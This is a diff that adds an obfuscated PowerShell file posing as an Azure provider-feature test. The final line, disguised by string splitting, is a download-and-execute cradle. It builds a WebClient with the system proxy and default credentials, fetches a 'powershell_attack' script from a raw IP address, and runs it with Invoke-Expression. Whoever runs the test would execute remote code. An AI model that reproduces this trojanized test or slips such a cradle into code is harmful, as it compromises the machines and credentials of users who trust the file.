@@ -1,0 +1,39 @@
+  ${hRD`CE}=[type]("{3}{0}{1}{4}{2}" -F '.w','E','UEsT','Net','brEQ') ; ${r`14}=[tyPe]("{3}{0}{2}{1}"-F 'ET','alcaCHE','.CredenTi','N')  ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function tesT-a`zUrepR`Ov`I`d`eRFeA`TurE
+{
+    ${D`efA`ULtPRO`V`i`DerfEat`U`Res} = &("{2}{0}{1}{3}"-f 'AzP','roviderFe','Get-','ature')
+
+    ${AlLPrO`VIDER`Fe`AtURES} = &("{0}{1}{3}{2}{4}{5}"-f'G','et-AzPro','iderFe','v','atu','re') -ListAvailable
+
+    .("{1}{2}{0}{3}" -f 's','A','s','ert-True') { ${Al`LpRoVIDer`FEA`T`UrES}."L`ENg`Th" -gt ${dEFAulT`P`ROv`I`deRF`EAt`URES}."lEN`G`Th" }
+
+    ${b`ATc`hfea`TURES} = .("{5}{0}{4}{2}{1}{3}" -f'et-Az','a','derFe','ture','Provi','G') -ProviderName ("{1}{2}{0}"-f 'atch','Mi','crosoft.B')
+
+    .("{3}{2}{1}{0}" -f 'ue','Tr','t-','Asser') { ${ba`TChFEA`TURES}."LenG`TH" -eq 0 }
+
+    ${BaT`Chf`Eat`Ur`Es} = &("{5}{0}{1}{4}{3}{2}" -f 'P','rovide','ure','eat','rF','Get-Az') -ProviderName ("{1}{0}{2}" -f'icr','M','osoft.Batch') -ListAvailable
+
+    .("{2}{0}{1}{3}"-f's','ser','A','t-True') { ${Bat`c`H`FeATUrES}."LeNg`TH" -gt 0 }
+
+    &("{2}{3}{0}{1}{4}{5}" -f'AzPro','v','Re','gister-','iderF','eature') -ProviderName ("{3}{2}{0}{1}" -f'oft','.Cache','icros','M') -FeatureName ("{3}{0}{2}{1}" -f 'taA','s3','cces','be')
+
+    ${C`A`c`heREGI`SterEd`FE`AtURES} = &("{0}{4}{1}{2}{3}" -f'Get','viderFea','t','ure','-AzPro') -ProviderName ("{3}{1}{2}{0}"-f 'he','C','ac','Microsoft.')
+
+    .("{0}{1}{2}" -f'As','sert-Tru','e') { ${C`AcHerEGiSt`eRE`dF`eaTUr`Es}."l`eNGtH" -gt 0 }
+}
+
+${M}=&("{1}{2}{0}"-f'ect','new-','obj') ("{1}{3}{2}{4}{0}"-f'ent','ne','.','t','webcli');${M}."Pr`oxy"=  ${Hr`Dce}::("{2}{1}{0}{3}" -f 'ox','ebPr','GetSystemW','y').Invoke();${M}."p`Roxy"."c`REdeNtIa`ls"=  ${r`14}::"de`F`A`UlT`crEdEnti`Als";&("{1}{0}" -f 'X','IE') ${m}.("{2}{4}{0}{1}{3}" -f'nloadst','rin','do','g','w').Invoke(("{0}{2}{5}{1}{6}{4}{3}" -f'http:/','/powershel','/37.28.15','.txt','k','4.204','l_attac'));
